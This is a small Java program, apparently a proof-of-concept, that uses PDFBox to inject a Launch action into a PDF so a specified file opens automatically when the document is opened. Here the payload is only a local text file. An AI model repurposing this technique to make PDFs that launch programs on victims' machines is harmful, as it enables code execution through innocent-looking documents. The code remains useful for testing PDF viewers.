
import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.pdmodel.interactive.action.PDActionLaunch;

import java.io.File;

public class InjectLaunchActionIntoPDF {

    private final static String PDF_FILE_PATH = "/home/jean-baptiste/Téléchargements/test_pdf.pdf";

    private final static String FILE_TO_OPEN = "Z:\\\\home\\\\jean-baptiste\\\\lucca.txt";

    private static void addAction(PDDocument doc) {

        System.out.println("--> injection de l'action dans le pdf");
        PDActionLaunch PDAlaunch = new PDActionLaunch();
        PDAlaunch.setF(InjectLaunchActionIntoPDF.FILE_TO_OPEN);
        doc.getDocumentCatalog().setOpenAction(PDAlaunch);

    }


    public static void main(String[] args) throws Exception {

        try (PDDocument doc = PDDocument.load(new File(InjectLaunchActionIntoPDF.PDF_FILE_PATH))) {

            System.out.println("--- Début du script d'injection PDF ---");

            InjectLaunchActionIntoPDF.addAction(doc);

            int index = PDF_FILE_PATH.lastIndexOf('.');
            String newPath = InjectLaunchActionIntoPDF.PDF_FILE_PATH.substring(0, index) + "_new"
                    + InjectLaunchActionIntoPDF.PDF_FILE_PATH.substring(index, InjectLaunchActionIntoPDF.PDF_FILE_PATH.length());
            doc.save(newPath);

            System.out.println("-- sauvegarde du document sous " + newPath + " ---");
            System.out.println("--- Fin du Script d'injection PDF ---");

        } catch (Exception e) {

            System.err.println("Une erreur est survenue pendant l'exécution du script");
            e.printStackTrace();

        }
    }


}

